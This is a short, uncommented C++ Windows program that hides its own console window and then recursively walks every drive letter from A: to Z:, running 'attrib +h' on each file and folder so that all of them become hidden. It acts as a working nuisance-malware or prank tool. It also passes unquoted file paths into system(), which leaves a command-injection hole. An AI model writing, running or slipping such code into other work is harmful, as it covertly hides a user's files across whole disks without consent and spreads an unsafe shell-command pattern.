#include <bits/stdc++.h>
#include <windows.h>
// #include <dir.h>
#include <conio.h>
#include <sys/stat.h>
#include <shlwapi.h>
#include <thread>
#include <dirent.h>
#include <vector>
#include <cstring>
#pragma comment(lib, "Shlwapi.lib")
using namespace std;
inline bool exists(const string name)
{
    struct stat buffer;
    return (stat(name.c_str(), &buffer) == 0);
}
WINBOOL HideConsole()
{
    HWND hwndc = GetConsoleWindow();
    return ShowWindow(hwndc, SW_HIDE);
}
void w()
{
    while (1)
        ;
}
bool GetFileNames(string path)
{
    DIR *pDir;
    struct dirent *ptr;
    if (!(pDir = opendir(path.c_str())))
    {
        //cout << "error:Folder doesn't Exist!" << endl;
        return 1;
    }
    while ((ptr = readdir(pDir)) != 0)
    {
        if (strcmp(ptr->d_name, ".") != 0 && strcmp(ptr->d_name, "..") != 0)
        {
            string file_names = path + "\\" + ptr->d_name;
			GetFileNames(file_names.data());
			string s2;
			s2="attrib +h "+file_names;
	        system(s2.data());
	        //cout<<file_names<<'\n';
        }
    }
    closedir(pDir);
    return 0;
}
int main()
{
    // system("wmic process where \"name='notepad.exe'\" call setpriority 128");
    HideConsole();
    
    for (char c = 'A'; c <= 'Z'; ++c)
    {
    	string s;
    	s+=c;
		s +=":";
        GetFileNames(s);
    }
    
    return 0;
}